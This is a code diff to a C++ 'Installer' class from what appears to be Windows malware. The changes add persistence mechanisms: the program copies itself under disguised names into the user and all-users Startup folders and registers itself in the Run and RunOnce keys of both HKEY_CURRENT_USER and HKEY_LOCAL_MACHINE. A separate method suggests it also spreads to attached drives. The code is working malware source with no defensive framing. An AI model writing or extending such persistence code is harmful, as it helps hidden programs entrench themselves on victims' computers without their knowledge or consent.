@@ -16,13 +16,16 @@ Installer::Installer()
 
 	appDataPath[0] = '\0';
 	_tcscat_s(appDataPath, appData);
-	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1));
+	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME1);
 
 	registryPath[0] = '\0';
 	_tcscat_s(registryPath, appData);
-	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));
+	_tcscat_s(registryPath, _T("\\") V_FAKE_NAME2);
 
 	free(appData);
+
+	startupPath[0] = '\0';
+	_tcscat_s(startupPath, _T("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME3);
 
 
 	const TCHAR* autorunStrU =
@@ -44,7 +47,7 @@ Installer::~Installer()
 
 bool Installer::SetAutorun(bool autorun)
 {
-	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun);
+	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun) | SetAutorunStartup(autorun);
 }
 
 bool Installer::InstallOnDrives()
@@ -119,12 +122,40 @@ bool Installer::SetAutorunAppdata(bool autorun)
 		return DeleteFile(appDataPath) != 0;
 	}
 }
+bool Installer::SetAutorunStartup(bool autorun)
+{
+	if (autorun)
+	{
+		return this->CopyTo(startupPath);
+	}
+	else
+	{
+		return DeleteFile(startupPath) != 0;
+	}
+}
 bool Installer::SetAutorunRegistry(bool autorun)
 {
+	bool ret = false;
+
+	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
+		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
+
+	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
+		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+
+	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
+		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
+
+	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
+		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+
+	return ret;
+}
+
+bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* subkey) {
 	HKEY hKey;
 
-	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
-		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+	if (RegCreateKeyEx(key, subkey,
 		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
 		!= ERROR_SUCCESS)
 	{
